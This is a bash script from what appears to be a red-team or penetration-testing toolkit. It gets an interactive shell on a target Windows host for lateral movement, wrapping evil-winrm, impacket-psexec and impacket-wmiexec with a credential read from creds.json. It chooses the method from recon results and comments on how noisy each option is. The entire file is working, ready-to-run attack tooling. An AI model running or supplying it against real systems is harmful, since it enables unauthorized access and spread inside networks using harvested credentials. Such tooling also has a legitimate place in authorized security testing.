#!/usr/bin/env bash
# =============================================================================
#  lateral_shell.sh  —  get an interactive shell on a host  (ATOMIC)
# =============================================================================
#  Attack-chain role: lateral movement / post-exploitation. Wraps evil-winrm,
#  impacket-psexec, and impacket-wmiexec, using whatever credential is in
#  creds.json, and drops you into an interactive shell on the target.
#
#  Method (-m / --method):
#    auto     (default) WinRM if 5985 is open in recon state, else psexec
#    winrm    evil-winrm (WinRM / 5985)
#    psexec   impacket-psexec (SMB service, SYSTEM, noisy)
#    wmiexec  impacket-wmiexec (WMI, semi-interactive, quieter than psexec)
#
#  The target is the HOST to land on (-t), not necessarily the DC.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
lateral_shell.sh — interactive shell on a host (ATOMIC)

USAGE:   ./lateral_shell.sh [-t host] [-d domain] [-m auto|winrm|psexec|wmiexec]
EXAMPLE: ./lateral_shell.sh -t 10.0.0.25 -m winrm

FLAGS:
  -m, --method <m>  auto (WinRM if 5985 open, else psexec) | winrm | psexec | wmiexec
  -h, --help        this help
  (shared flags -t/-d: --help-common)

WHAT IT DOES: wraps evil-winrm / impacket-psexec / impacket-wmiexec using a cred
  from creds.json and drops you into an interactive shell on -t (the host, not
  necessarily the DC).
PREREQS: a usable credential in creds.json.
EOF
}

METHOD="auto"

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -m|--method) METHOD="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <host>"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"
# For shells, point impacket at the TARGET host (not necessarily the DC).
DC="$TARGET"

# Resolve 'auto' to a concrete method using recon state.
if [[ "$METHOD" == "auto" ]]; then
  if port_seen_open 5985; then METHOD="winrm"; else METHOD="psexec"; fi
  log_info "auto-selected method: ${METHOD}"
fi

log_begin
log_info "lateral shell to ${TARGET} as ${DOMAIN}/${SEL_USER} (${SEL_STYPE}) via ${METHOD}"

case "$METHOD" in
  winrm)
    need_cmd evil-winrm
    run_interactive "evil-winrm -i ${TARGET} $(winrm_auth)"
    ;;
  psexec)
    need_cmd impacket-psexec
    run_interactive "impacket-psexec $(imp_target) $(imp_secret_flags)"
    ;;
  wmiexec)
    need_cmd impacket-wmiexec
    run_interactive "impacket-wmiexec $(imp_target) $(imp_secret_flags)"
    ;;
  *) die "unknown method: ${METHOD}" ;;
esac

[[ "$LAST_RC" -eq 0 ]] && log_end "success" || log_end "partial"
